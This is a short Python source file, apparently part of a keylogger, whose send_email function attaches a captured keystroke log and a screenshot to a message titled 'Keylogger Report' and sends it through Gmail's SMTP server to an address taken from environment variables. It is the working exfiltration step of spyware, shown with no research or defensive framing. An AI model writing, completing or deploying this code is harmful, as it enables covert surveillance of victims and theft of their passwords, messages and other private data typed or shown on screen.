import smtplib
import os
import mimetypes
from email.message import EmailMessage

# Load environment variables
EMAIL_SENDER = os.getenv("SENDER_EMAIL")
EMAIL_PASSWORD = os.getenv("SENDER_PASSWORD")
EMAIL_RECEIVER = os.getenv("RECEIVER_EMAIL")

def send_email():
    try:
        msg = EmailMessage()
        msg["Subject"] = "Keylogger Report"
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        msg.set_content("Attached are the latest keystroke logs and screenshots.")

        # Attach Keystroke Log (text file)
        log_filename = "keystrokes.txt"
        if os.path.exists(log_filename):
            with open(log_filename, "rb") as f:
                msg.add_attachment(f.read(), maintype="text", subtype="plain", filename=log_filename)

        # Attach Latest Screenshot (image file)
        screenshot_filename = "latest_screenshot.png"
        if os.path.exists(screenshot_filename):
            with open(screenshot_filename, "rb") as f:
                msg.add_attachment(f.read(), maintype="image", subtype="png", filename=screenshot_filename)

        # Send the email
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)

        print("✅ Email Sent Successfully!")

    except Exception as e:
        print(f"❌ Email Error: {e}")
